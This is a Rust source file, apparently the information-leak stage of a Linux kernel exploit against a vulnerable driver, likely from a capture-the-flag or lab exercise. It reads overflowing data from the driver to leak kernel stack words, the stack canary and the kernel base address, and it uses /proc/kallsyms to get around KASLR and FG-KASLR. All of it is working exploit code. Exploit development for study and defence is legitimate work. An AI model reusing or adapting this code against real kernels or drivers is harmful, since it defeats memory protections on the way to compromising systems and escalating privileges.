use std::fs::File;
use std::io::prelude::*;

use crate::fgkaslr::KAllSyms;

const WSIZE: usize = std::mem::size_of::<u64>();

const PROC_KALLSYMS: &str = "/proc/kallsyms";

pub fn leak_kstack(drv: &mut File) {
    const N: usize = 63; // max that can leak without reachin `BUG`
    let mut leak = [0; { N * WSIZE }];
    eprintln!("[+] Reading {N} words from the driver");
    let n = drv.read(&mut leak).expect("driver supports reading");

    let mut kallsyms = KAllSyms::new(PROC_KALLSYMS).unwrap();
    let base = kallsyms
        .find(|sym| sym.name == "startup_64")
        .unwrap()
        .address as u64;

    eprintln!("[+] We have leaked:");
    for i in (0..n).step_by(WSIZE) {
        let bytes = leak[i..i + WSIZE].try_into().unwrap();
        let word = u64::from_ne_bytes(bytes);
        if i == crate::CANARY_OFF {
            eprintln!("---- Canary found: {word:#018x}");
        } else {
            eprintln!("\t leak + {i:#x} = {word:#018x}");
        }
        if word > base && (word - base) < u16::MAX as u64 {
            eprintln!("\t*** Posible base leak, offset {:#x} ***", word - base)
        }
    }
}

pub fn leak_base(drv: &mut File) -> usize {
    const BASE_OFF: usize = 0x130;
    const LEAK_OFF: usize = 0xa157;
    let mut leak = [0; { BASE_OFF + WSIZE }];
    eprintln!("[+] Reading base from the driver");
    drv.read(&mut leak).expect("driver supports reading");
    let bytes = leak[BASE_OFF..].try_into().unwrap();
    usize::from_ne_bytes(bytes) - LEAK_OFF
}

pub fn leak_canary(drv: &mut File) -> usize {
    let mut leak = [0; { crate::CANARY_OFF + WSIZE }];
    eprintln!("[+] Reading canary from the driver");
    drv.read(&mut leak).expect("driver supports reading");
    let bytes = leak[crate::CANARY_OFF..].try_into().unwrap();
    usize::from_ne_bytes(bytes)
}
